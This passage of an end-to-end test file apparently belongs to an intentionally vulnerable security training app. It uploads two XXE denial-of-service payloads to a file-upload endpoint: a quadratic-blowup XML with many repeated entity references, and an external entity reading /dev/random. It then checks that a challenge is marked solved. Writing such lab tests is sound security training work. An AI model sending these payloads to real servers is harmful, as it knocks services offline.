>]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>'], {type: 'application/xml'})
          data.append('file', blob, 'xxeQuadraticBlowup.xml')

          const request = new XMLHttpRequest()
          request.open('POST', '/file-upload')
          request.send(data)
        })
        browser.driver.wait(4000)
        browser.ignoreSynchronization = false
      })
      protractor.expect.challengeSolved({ challenge: 'XXE Tier 2' })
    }

    if ((process.platform === 'linux' || process.platform === 'darwin') && !process.env.TRAVIS_BUILD_NUMBER) {
      it('should be possible to trigger request timeout on Linux server via .xml upload with /dev/random XXE attack', () => {
        browser.ignoreSynchronization = true
        browser.executeScript(() => {
          const data = new FormData()
          const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
          data.append('file', blob, 'xxeDosForLinux.xml')

          const request = new XMLHttpRequest()
          request.open('POST', '/file-upload')
          request.send(data)
        })
        browser.driver.wait(4000)
        browser.ignoreSynchronization = false
      })
      protractor.expect.challengeSolved({ challenge: 'XXE Tier 2' })
    }
  })
})
